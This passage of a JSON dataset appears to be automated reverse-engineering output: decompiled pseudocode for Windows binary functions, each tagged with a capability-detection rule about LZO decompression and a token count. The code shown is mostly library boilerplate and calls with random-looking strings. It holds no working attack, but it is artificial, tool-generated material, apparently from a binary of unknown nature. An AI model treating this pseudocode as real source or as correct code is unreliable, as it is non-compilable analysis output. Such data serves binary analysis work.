            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004049a3(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x450940;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"qdrhwgaazleyun\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0x88e5;\n}\n",
        "token_count": 179
    },
    "00404aac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404aac(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040458e();\n    if (uVar1 < arg_8h) {\n        fcn.00404dfe(arg_8h - uVar1, arg_ch);\n    }\n    else {\n        fcn.00404e67(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "00404b1f": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00404b1f(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_40h;\n    uint var_3ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x450320;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"vcmkxoljdoyprlshgdtpjczzbivasvbfmrzzydrbtt\");\n    var_10h = 1;\n    fcn.00401e79(\"mimadudylwwihbwxdubsnkzs\");\n    var_10h = 2;\n    fcn.00401e79(\"bnekrrugwir\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 318
    },
    "00404cd2": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404cd2(uint arg_8h)\n\n{\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    (**(*in_ECX + 0x14))(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 67
    },
    "00404ee9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ee9(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004045fc(arg_8h);\n    *in_ECX = vtable.std::bad_alloc.0;\n    return;\n}\n",
        "token_count": 71
    },
    "00404ff2": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 fcn.00404ff2(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x450260;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"okpzqmarrajaognzzselzpzdslmr\");\n    uStack24 = 0;\n    fcn.00401e79(\"kfsipyaoamgtamvvidtspwnfpwlscjnznzwe\");\n    uStack24 = 1;\n    fcn.00401e79(\"dfetipfwjtwdnmbfasaxybjlsyieccttjcqtkwanjeryzjgdmzqxxquibafqmo\");\n    uStack24 = 2;\n    fcn.00401e79(\"pvzlvwiijfyrcpoaarvleivrxkdgdalnjxdefhqgiadxxza\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546b24;\n}\n",
        "token_count": 314
    },
    "004053a8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.004053a8(uint arg_8h, uint arg_ch)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x427220;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.0040181b(arg_ch);\n    *in_ECX = vtable.std::ctype_char_.0;\n    var_10h = 0;\n    fcn.0040267b(arg_8h);\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 195
    },
    "004054e3": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004054e3(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x451860;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 2;\n    fcn.00401e79(\"pmuetlnnbbq\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 221
    },
    "00405542": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405542(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404309();\n    if (iVar2 == 0) {\ncode_r0x004a67ee:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        uVar4 = fcn.004037ce();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402798(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a67ee;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 430
    },
    "00405574": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t * fcn.00405574(uint32_t *param_1, uint8_t param_2, uint32_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    char cVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    \n    if (param_3 != NULL) {\n        uVar6 = param_2;\n        uVar2 = param_1 & 3;\n        while (uVar2 != 0) {\n            uVar1 = *param_1;\n            param_1 = param_1 + 1;\n            if (uVar1 == param_2) goto code_r0x00489966;\n            param_3 = param_3 - 1;\n            if (param_3 == NULL) {\n                return NULL;\n            }\n            uVar2 = param_1 & 3;\n        }\n        puVar3 = param_3 + -1;\n        if (0x3 < param_3) {\n            uVar6 = uVar6 * 0x1010101;\n            puVar4 = param_1;\n            do {\n                param_1 = puVar4 + 1;\n                if (((*puVar4 ^ uVar6 ^ 0xffffffff ^ (*puVar4 ^ uVar6) + 0x7efefeff) & 0x81010100) != 0) {\n                    uVar2 = *puVar4;\n                    cVar5 = uVar6;\n                    if (uVar2 == cVar5) {\n                        return puVar4;\n                    }\n                    if (uVar2 >> 8 == cVar5) {\n                        return puVar4 + 1;\n                    }\n                    if ((uVar2 & 0xffff0000) >> 0x10 == cVar5) {\n                        return puVar4 + 2;\n                    }\n                    if ((uVar2 & 0xffff0000) >> 0x18 == cVar5) goto code_r0x00489966;\n                }\n                bVar7 = 0x3 < puVar3;\n                puVar3 = puVar3 + -1;\n                puVar4 = param_1;\n            } while (bVar7);\n        }\n        for (param_3 = puVar3 + 1; param_3 != NULL; param_3 = param_3 - 1) {\n            cVar5 = *param_1;\n            param_1 = param_1 + 1;\n            if (cVar5 == uVar6) {\ncode_r0x00489966:\n                return param_1 + -1;\n            }\n        }\n    }\n    return param_3;\n}\n",
        "token_count": 602
    },
    "00405600": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00405600(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_54h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x4517a0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.00401e79(\"ynxezrareueofeyxjkqoihiwzylyxtvssolnajqcrwvrmsmgbxqonmdppqwjwxbqhxoxdrv\");\n    var_10h = 0;\n    fcn.00401e79(\"gwzibxxzc\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 235
    },
    "00405614": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00405614(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint arg_ch_00;\n    uint *in_ECX;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    \n    var_18h = in_ECX[4];\n    var_14h = in_ECX;\n    iVar1 = fcn.0040257c();\n    if (iVar1 - var_18h < arg_8h) {\n        fcn.0040393b();\n    }\n    var_1ch = var_18h + arg_8h;\n    var_20h = var_14h[5];\n    var_24h = fcn.00403d23(var_1ch);\n    var_28h = fcn.0040407a();\n    var_2ch = fcn.004015aa(var_24h + 1);\n    fcn.00401b09();\n    var_14h[4] = var_1ch;\n    var_14h[5] = var_24h;\n    arg_8h_01 = fcn.00405290(var_2ch);\n    iVar1 = var_18h;\n    if (var_20h < 0x10) {\n        fcn.00405c31(arg_8h_01, var_14h, var_18h, arg_10h, arg_14h);\n        fcn.004025b8(var_14h, &var_2ch);\n    }\n    else {\n        arg_8h_00 = *var_14h;\n        arg_ch_00 = fcn.00405290(arg_8h_00);\n        fcn.00405c31(arg_8h_01, arg_ch_00, iVar1, arg_10h, arg_14h);\n        fcn.0040123a(arg_8h_00, var_20h + 1);\n        *var_14h = var_2ch;\n    }\n    return in_ECX;\n}\n",
        "token_count": 574
    },
    "004057f9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004057f9(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_bp_10h;\n    \n    uVar3 = arg_8h;\n    fcn.00403ea9(arg_8h);\n    iVar1 = *(in_ECX + 0x10);\n    if (*(in_ECX + 0x14) - iVar1 < arg_ch) {\n        var_bp_10h = fcn.004012ad(arg_ch, uVar3 & 0xffffff00 | var_24h, arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        *(in_ECX + 0x10) = iVar1 + arg_ch;\n        iVar2 = fcn.00406087();\n        iVar2 = iVar2 + arg_8h;\n        fcn.00402b9e(iVar2 + arg_ch, iVar2, (iVar1 - arg_8h) + 1);\n        fcn.0040146f(iVar2, arg_ch, arg_10h);\n        var_bp_10h = in_ECX;\n    }\n    return var_bp_10h;\n}\n",
        "token_count": 347
    },
    "00405902": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004ba2dc)\n\nvoid __cdecl fcn.00405902(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t arg_ch_00;\n    int32_t arg_10h;\n    int32_t *piVar4;\n    uint32_t arg_8h_00;\n    uint32_t uVar5;\n    bool bVar6;\n    uint64_t uVar7;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    arg_8h_00 = 0;\n    piVar4 = arg_8h + 2;\n    var_4h = 0;\n    piVar3 = arg_8h[1] + 8 + arg_8h;\n    arg_10h = ((*(arg_ch + 4) == '\\0') - 1 & 0x1d) + 0x17 + *arg_8h;\n    for (arg_ch_00 = var_4h; (piVar4 != piVar3 && (uVar7 = fcn.00406000(),  CONCAT44(arg_ch_00, arg_8h_00) <= uVar7));\n        arg_ch_00 = (arg_ch_00 << 4 | uVar2) + CARRY4(uVar5, uVar1)) {\n        uVar1 = *piVar4;\n        uVar2 = arg_8h_00 >> 0x1c;\n        uVar5 = arg_8h_00 * 0x10;\n        arg_8h_00 = uVar5 + uVar1;\n        piVar4 = piVar4 + 1;\n        arg_10h = arg_10h + -4;\n    }\n    bVar6 = true;\n    var_4h = arg_ch_00;\n    while ((var_4h = var_4h & 0xffffff00 | bVar6,  piVar4 != piVar3 && (bVar6))) {\n        uVar1 = *piVar4;\n        piVar4 = piVar4 + 1;\n        bVar6 = uVar1 == 0;\n    }\n    fcn.00406906(arg_8h_00, arg_ch_00, arg_10h, *(arg_8h + 0xc2), var_4h, arg_ch);\n    return;\n}\n",
        "token_count": 551
    },
    "004059c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.004059c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x451760;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"bzawdgkxavxjdoyndhotbrookctrsncxpqoppkrazkggbsqjtyxclzugelbptqbjwwegkblpkrx\");\n    uStack24 = 0;\n    fcn.00401e79(\"bmmoxckhvimkwaxvmqouckpuebtckuhnmvjihbbdzpecfwoidgenejzdlwqgdxjh\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x547444;\n}\n",
        "token_count": 278
    },
    "00405a7e": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00405a7e(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x451180;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(\"ildxmazeldomp\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 198
    },
    "00405aec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00405aec(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4509e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"fapkxgmkhzbivnsmxboucvfoovkudqxkfwgwrwitc\");\n    uStack24 = 3;\n    fcn.00401e79(\"lfdpqcyejwmkysekvxslybvpoamlvaojktcvhoemleqadouvodhaxrfojjifmrryuupigkicaiirketlmlikrekdfgpwts\");\n    uStack24 = 4;\n    fcn.00401e79(\"qtllveijgvajytjnhbykznabwuuabxsvhu\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 316
    },
    "00405c86": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405c86(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450cc0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"xspbrterpeavksnymemicgwogkwjepdgirehcrxnviazccorbdbiypsbntd\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x159c0;\n}\n",
        "token_count": 195
    },
    "00405ec5": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405ec5(uint arg_8h)\n\n{\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    (**(*in_ECX + 0x1c))(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 68
    },
    "00405fd3": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405fd3(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffffa4;\n    var_10h = 0xffffffff;\n    var_14h = 0x426fc0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = arg_8h;\n    var_20h = arg_ch;\n    fcn.00401e79(arg_10h);\n    var_10h = 0;\n    fcn.00402b44(var_24h, var_20h, &var_40h);\n    fcn.00403b02();\n    *in_ECX = vtable.std::system_error.0;\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 289
    },
    "00406091": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00406091(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x4508a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"jarkjewgshlwjwbnvprsmoxqtrd\");\n    uStack24 = 0;\n    fcn.00401e79(\"zkjykfejhksveefenhuevoprrphjnyufhshgtnzakwldjqkvgbnljzxjag\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0x17c5a;\n}\n",
        "token_count": 245
    },
    "0040614a": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040614a(uint arg_8h)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040173f(arg_8h);\n    fcn.00401f3c();\n    return;\n}\n",
        "token_count": 65
    },
    "004064d8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004064d8(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404309();\n    if (iVar2 == 0) {\ncode_r0x004a6b19:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        uVar4 = fcn.004037ce();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402798(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a6b19;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 433
    },
    "004064e2": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004064e2(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00401e79(0x54fc63);\n    return arg_8h;\n}\n",
        "token_count": 56
    },
    "0040661d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040661d(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.00405e02(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x004a64c4:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.00406622();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.00404309();\n            if (iVar3 == 0) {\ncode_r0x004a64dc:\n                puVar4 = fcn.00403a35();\n                *puVar4 = 0x16;\n                fcn.004037ce();\n                goto code_r0x004a64c4;\n            }\n            iVar3 = fcn.00402798(*(param_1 + 0x2c));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x004a64dc;\n                iVar3 = *(param_1 + 0x18);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x30) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 425
    },
    "0040670d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040670d(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x451840;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 3;\n    fcn.00401e79(\"cdadhabaijmwbymqngwf\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 197
    },
    "004067ee": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004067ee(int32_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint var_10h;\n    uint lpArguments;\n    int32_t *var_8h;\n    uint8_t *var_4h;\n    \n    lpArguments = 0x19930520;\n    if (arg_ch != NULL) {\n        if ((*arg_ch & 0x10) != 0) {\n            iVar1 = *(*arg_8h + -4);\n            pcVar2 = *(iVar1 + 0x20);\n            arg_ch = *(iVar1 + 0x18);\n            (**0x578000)(*arg_8h + -4);\n            (*pcVar2)();\n            if (arg_ch == NULL) goto code_r0x004864a8;\n        }\n        if ((*arg_ch & 8) != 0) {\n            lpArguments = 0x1994000;\n        }\n    }\ncode_r0x004864a8:\n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0xe06d7363, 1, 3, &lpArguments);\n    return;\n}\n",
        "token_count": 283
    },
    "00406857": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 fcn.00406857(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x4511c0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"sacinjydpwzncraygtsoxqwdslzeskqpvtrjfbycrytngylhuwawvkugysexbraazvjfvnejmdiuirzbaixbv\");\n    uStack24 = 0;\n    fcn.00401e79(\"khjtpypcayzlrzfuxggtp\");\n    uStack24 = 1;\n    fcn.00401e79(\"sivnazzcqmwsxpvlezuriufsiiefrqennvkuzgg\");\n    uStack24 = 2;\n    fcn.00401e79(\"bpqikzgsfqljswoojyvjkkrsyhqorvlquahcviqguy\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x5471a4;\n}\n",
        "token_count": 329
    },
    "00406893": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t fcn.00406893(int32_t param_1, uint32_t *param_2, uint32_t param_3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (param_3 != 0) {\n        param_1 = param_1 - param_2;\n        uVar2 = param_2 & 3;\n        while( true ) {\n            if (uVar2 == 0) {\n                while (((param_1 + param_2 & 0xfffU) < 0xffd && (uVar2 = *(param_1 + param_2),  uVar2 == *param_2))) {\n                    bVar3 = param_3 < 4;\n                    param_3 = param_3 - 4;\n                    if (bVar3 || param_3 == 0) {\n                        return 0;\n                    }\n                    param_2 = param_2 + 1;\n                    if ((~uVar2 & uVar2 + 0xfefefeff & 0x80808080) != 0) {\n                        return 0;\n                    }\n                }\n            }\n            uVar1 = *(param_1 + param_2);\n            if (uVar1 != *param_2) {\n                return -(uVar1 < *param_2) | 1;\n            }\n            if (uVar1 == 0) break;\n            param_2 = param_2 + 1;\n            bVar3 = param_3 == 0;\n            param_3 = param_3 - 1;\n            if (bVar3 || param_3 == 0) {\n                return 0;\n            }\n            uVar2 = param_2 & 3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 393
    },
    "00412880": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
